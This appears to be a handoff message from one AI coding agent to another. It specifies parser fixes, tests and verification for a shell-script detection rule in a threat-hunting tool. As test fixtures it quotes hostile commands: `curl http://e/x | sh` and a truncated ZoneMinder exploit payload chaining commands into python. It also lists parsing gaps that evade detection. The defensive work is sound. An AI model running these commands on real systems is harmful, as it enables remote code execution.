
# 2026-10-18 20:43 EDT · Claude → Codex: FINAL M1 PARSER ROUND. Execute only; no planning step.

**Gate result on your allow-list round:** every earlier reproduction is fixed. The reviewer then found new inputs where the allow-list accepts a script but reads it differently from bash. Rather than keep hardening, **the owner decided (option 2) that script-text rules are positive-only indicators.** Claude implemented that in `9120190`:
- `Playbook.assures_negative`
- coverage state `positive_only`, shown as "not assessable by design"
- claim type `script_content`, worded as "a shell started with a script that contains…"
- `host.exec_from_temp_dir` counts an unknown `-c` layout as unevaluable

Claude also fixed F8 (aggregate consume-time matches counted as complete negatives) in `3f18b3a`. Live model-off hunt `h20261019-004146-c4d1e9` is `completed_within_scope`, with 0 errors, 0 broken citations, and 7 urgent findings including both process-level `curl … | sh` persistence findings.

So the parser gaps the reviewer found (newline after `|`, `time`, `NAME+=`, `0<`, `+e`, wrappers like `nohup`/`sudo`) can no longer produce a false complete negative. They can only cost a script-text *lead*. Don't harden them further in this round. **Implement only the items below, test-first, one commit each, in order. No plan or approval request.**

### 1 (F6, the parser half): `shell_script_of` / `_has_c_option` scans past the script file
`["bash", "/tmp/x.sh", "-c"]` and `["bash", "/tmp/x.sh", "-recursive"]` are treated as `-c` layouts (unknown), so `host.exec_from_temp_dir` can't see a script run from `/tmp`. Bash stops option parsing at the first non-option argument.

**Done when:** option scanning stops at the first non-option argument (as bash does); both argvs above return `None`, so the temp-dir rule matches `/tmp/x.sh`; and `bash -c -- S`, `bash -o pipefail -c S`, `bash -c +e S`, `sh -c +e S` and `bash -lc +e S` return `UnknownShellScript`. Treat a script argument starting with `+` or `-` as unknown.

### 2 (F7): login-shell `argv[0]` isn't recognised as a shell
`["-bash", "-c", "curl http://e/x | sh"]` (as `su - user -c` and `sudo -i` produce) is treated as "no script".

**Done when:** one leading `-` is stripped from `argv[0]` before the shell lookup, and fixtures cover `-bash` and `-sh`.

### 3 (F12, minor): non-POSIX shells
`SHELLS` includes `zsh` and `ksh`, but the lexer models bash/POSIX.

**Done when:** `shell_script_of` returns `UnknownShellScript` for zsh, ksh, fish and csh-family `-c` scripts.

### 4 (Important, recovers a real finding): prefix indicators for the web-service rule
Since `$` became unmodelled, the ZoneMinder exploit payload (`sh -c /usr/bin/zmu -A -a -m ;echo … | exec $(which python…)`, the attacker's initial access at 14:23:12) dropped from high to lead. Its "additional commands chained after application helper" indicator sits in the part of the script *before* the first unmodelled construct. A positive on partial evidence is allowed.

**Done when:**
- The lexer can return the cleanly lexed prefix up to the first unmodelled construct, flagged as partial.
- `interpreter_indicators` evaluates indicators over that prefix only, and records in the match note that the script was only partially modelled.
- The lab payload event is `high` again.
- A test proves a prefix that ends in an unclosed construct can't produce a chaining indicator from text after the cut.
- This feeds only positives. It never changes `positive_only` coverage, and never makes a cell complete.

### 5 (F13, test strength)
`tests/test_sweep.py:262` (`assert states != {"no_match_complete"}`) passes even when one rule is falsely complete. **Done when:** each relevant rule's cell is asserted separately.

### Rules
- Don't change decision-policy lanes, the read-only allowlist, or Claude's `assures_negative` / `positive_only` semantics.
- Don't undo `7d019b9`, `2663e1d`, `b332dac`, `a74c5f3`, `05aba63`, `3f18b3a` or `9120190`.
- Never read `/home/user/romulus-eval/` or touch v1.

### Verify, then hand back
- Run the full suite and the archmap check.
- Deploy from PowerShell with `scripts/deploy.ps1 -SkipInstall` and confirm the stamp matches `HEAD`.
- Run one model-off lab hunt over 2024-11-18T10:00Z–17:30Z. Expected: `completed_within_scope`, 0 errors, 0 broken citations, 7 urgent, and **11 high** (the exploit payload back). Explain any other change.
- Replace this message with your results (header with date and time).
- Then stop. Claude will run the final gate.
